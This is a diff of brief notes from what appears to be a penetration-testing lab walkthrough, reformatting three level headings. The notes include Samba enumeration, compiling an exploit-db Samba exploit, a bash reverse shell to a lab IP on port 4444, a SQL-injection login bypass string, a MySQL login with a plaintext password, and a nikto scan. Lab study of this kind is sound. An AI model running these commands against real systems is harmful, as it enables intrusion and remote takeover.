@@ -1,7 +1,7 @@
---Level 1-- 
-enum4linux 192.168.139.128
+#### --Level 1-- 
+enum4linux      192.168.139.128
 
-searchsploit Samba 2.2
+***searchsploit Samba 2.2
 
 gcc /usr/share/exploitdb/exploits/multiple/remote/10.c -o exploitsamba
 
@@ -9,7 +9,7 @@ gcc /usr/share/exploitdb/exploits/multiple/remote/10.c -o exploitsamba
 
 bash -i >& /dev/tcp/192.168.139.129/4444 0>&1
 
---Level 2--
+#### --Level 2--
 
 SQL injection: admin'or '1'-'1
 
@@ -27,7 +27,7 @@ mysql -u john -p
 Enter password: hiroshima
 show databases;
 
---Level 3--
+#### --Level 3--
 
 nikto -host 192.168.139.131
 
